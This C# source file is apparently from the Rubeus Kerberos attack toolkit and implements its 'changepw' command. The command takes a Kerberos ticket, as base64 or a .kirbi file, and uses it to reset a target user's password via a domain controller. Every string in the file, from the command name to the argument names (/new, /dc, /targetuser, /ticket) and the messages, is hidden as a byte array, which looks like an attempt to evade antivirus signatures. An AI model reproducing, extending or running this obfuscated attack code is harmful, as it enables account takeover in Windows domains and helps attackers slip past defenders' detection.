using System;
using System.Collections.Generic;
using System.IO;


namespace Rubeus.Commands
{
    public class Changepw : ICommand
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
        public static string CommandName => S(new byte[] { 99, 104, 97, 110, 103, 101, 112, 119 });

        public void Execute(Dictionary<string, string> arguments)
        {
            string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);

            Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 82, 101, 115, 101, 116, 32, 85, 115, 101, 114, 32, 80, 97, 115, 115, 119, 111, 114, 100, 32, 40, 65, 111, 114, 97, 116, 111, 80, 119, 41, 13, 10 }));

            string newPassword = S(new byte[] {});
            string dc = S(new byte[] {});
            string targetUser = null;

            if (arguments.ContainsKey(S(new byte[] { 47, 110, 101, 119 })))
            {
                newPassword = arguments[S(new byte[] { 47, 110, 101, 119 })];
            }
            if (String.IsNullOrEmpty(newPassword))
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 78, 101, 119, 32, 112, 97, 115, 115, 119, 111, 114, 100, 32, 109, 117, 115, 116, 32, 98, 101, 32, 115, 117, 112, 112, 108, 105, 101, 100, 32, 119, 105, 116, 104, 32, 47, 110, 101, 119, 58, 88, 32, 33, 13, 10 }));
                return;
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 100, 99 })))
            {
                dc = arguments[S(new byte[] { 47, 100, 99 })];
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 116, 97, 114, 103, 101, 116, 117, 115, 101, 114 }))) {
                targetUser = arguments[S(new byte[] { 47, 116, 97, 114, 103, 101, 116, 117, 115, 101, 114 })];
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 116, 105, 99, 107, 101, 116 })))
            {
                string kirbi64 = arguments[S(new byte[] { 47, 116, 105, 99, 107, 101, 116 })];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    Reset.UserPassword(kirbi, newPassword, dc, targetUser);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    Reset.UserPassword(kirbi, newPassword, dc, targetUser);
                }
                else
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 47, 116, 105, 99, 107, 101, 116, 58, 88, 32, 109, 117, 115, 116, 32, 101, 105, 116, 104, 101, 114, 32, 98, 101, 32, 97, 32, 46, 107, 105, 114, 98, 105, 32, 102, 105, 108, 101, 32, 111, 114, 32, 97, 32, 98, 97, 115, 101, 54, 52, 32, 101, 110, 99, 111, 100, 101, 100, 32, 46, 107, 105, 114, 98, 105, 13, 10 }));
                }
                return;
            }
            else
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 65, 32, 47, 116, 105, 99, 107, 101, 116, 58, 88, 32, 110, 101, 101, 100, 115, 32, 116, 111, 32, 98, 101, 32, 115, 117, 112, 112, 108, 105, 101, 100, 33, 13, 10 }));
                return;
            }
        }
    }
}